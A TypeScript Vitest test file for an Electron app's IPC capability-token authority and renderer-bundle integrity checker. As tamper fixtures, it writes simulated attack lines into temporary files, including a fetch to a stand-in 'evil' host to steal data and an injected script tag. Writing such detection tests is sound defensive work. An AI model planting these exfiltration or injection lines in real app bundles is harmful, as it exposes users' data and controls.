// F28/F29 — the desktop IPC authority + renderer-integrity substrate. These prove the security logic
// the Electron app wires in; the app layer (BrowserWindow/CSP/sandbox) is exercised separately.
import { describe, it, expect } from 'vitest';
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { IpcAuthority } from './ipcauthority';
import { buildRendererManifest, verifyRenderer, guardRenderer, rendererAssets } from './rendererintegrity';

function rendererDir(files: Record<string, string>): string {
  const d = mkdtempSync(join(tmpdir(), 'sf-rend-'));
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(d, rel);
    mkdirSync(join(abs, '..'), { recursive: true });
    writeFileSync(abs, content);
  }
  return d;
}

describe('F28 — IPC authority is main-owned; the renderer cannot forge it', () => {
  const auth = () => new IpcAuthority({ operator: 'scott', integrityOk: () => true });

  it('a call with no capability token is refused (renderer JS cannot self-authorize)', () => {
    const v = auth().authorize({ op: 'approve' });
    expect(v.allow).toBe(false);
    expect(v.reason).toContain('capability token');
  });

  it('a call with a wrong token is refused', () => {
    const v = auth().authorize({ op: 'setRiskTolerance', token: 'deadbeef'.repeat(8) });
    expect(v.allow).toBe(false);
  });

  it('the correct token authorizes — and the operator is MAIN-assigned, not caller-supplied', () => {
    const a = auth();
    const v = a.authorize({ op: 'approve', token: a.sessionToken() });
    expect(v.allow).toBe(true);
    expect(v.operator).toBe('scott');   // never a renderer-supplied actor
  });

  it('a tampered renderer refuses privileged IPC even WITH a valid token', () => {
    const a = new IpcAuthority({ operator: 'scott', integrityOk: () => false });
    const v = a.authorize({ op: 'delete', token: a.sessionToken() });
    expect(v.allow).toBe(false);
    expect(v.reason).toContain('integrity');
  });

  it('tokens differ per authority instance (per-session)', () => {
    expect(auth().sessionToken()).not.toBe(auth().sessionToken());
  });
});

describe('F28/F29 — renderer bundle integrity: on-load, on-change, periodic', () => {
  const files = { 'index.html': '<script src="app.js">', 'assets/app.js': 'console.log(1)', 'assets/style.css': 'body{}' };

  it('a clean renderer verifies; only code/markup assets are covered', () => {
    const d = rendererDir({ ...files, 'assets/logo.png': 'binary' });
    const m = buildRendererManifest(d);
    expect(rendererAssets(d)).not.toContain('assets/logo.png');   // png is not executable/injectable
    expect(verifyRenderer(d, m).ok).toBe(true);
  });

  it('a MODIFIED asset is detected', () => {
    const d = rendererDir(files);
    const m = buildRendererManifest(d);
    writeFileSync(join(d, 'assets/app.js'), 'fetch("https://evil/steal")');   // tamper the shipped bundle
    const r = verifyRenderer(d, m);
    expect(r.ok).toBe(false);
    expect(r.changed).toContain('assets/app.js');
  });

  it('an INJECTED script (new executable file) is detected', () => {
    const d = rendererDir(files);
    const m = buildRendererManifest(d);
    writeFileSync(join(d, 'assets/inject.js'), 'window.starfish.setRiskTolerance("medium")');
    const r = verifyRenderer(d, m);
    expect(r.ok).toBe(false);
    expect(r.added).toContain('assets/inject.js');
  });

  it('a REMOVED asset is detected', () => {
    const d = rendererDir(files);
    const m = buildRendererManifest(d);
    rmSync(join(d, 'assets/style.css'));
    expect(verifyRenderer(d, m).ok).toBe(false);
  });

  it('guardRenderer fires onTamper once and latches ok()=false; a fake clock drives the periodic sweep', () => {
    const d = rendererDir(files);
    const m = buildRendererManifest(d);
    let fired: string | undefined;
    const ticks: Array<() => void> = [];
    const g = guardRenderer({
      dir: d, manifest: m,
      onTamper: (r) => { fired = r.reason; },
      setInterval: (fn) => { ticks.push(fn); return {} as never; },
      clearInterval: () => {},
    });
    expect(g.ok()).toBe(true);           // clean on load
    writeFileSync(join(d, 'assets/app.js'), 'evil');   // tamper AFTER load
    ticks.forEach((fn) => fn());          // periodic sweep runs
    expect(fired).toContain('tampered');
    expect(g.ok()).toBe(false);           // latched
    g.stop();
  });

  it('guardRenderer catches a bundle already tampered at load time', () => {
    const d = rendererDir(files);
    const m = buildRendererManifest(d);
    writeFileSync(join(d, 'index.html'), '<script src="https://evil">');   // swapped while app was closed
    let fired = false;
    const g = guardRenderer({ dir: d, manifest: m, onTamper: () => { fired = true; }, setInterval: () => ({} as never), clearInterval: () => {} });
    expect(fired).toBe(true);
    expect(g.ok()).toBe(false);
    g.stop();
  });
});
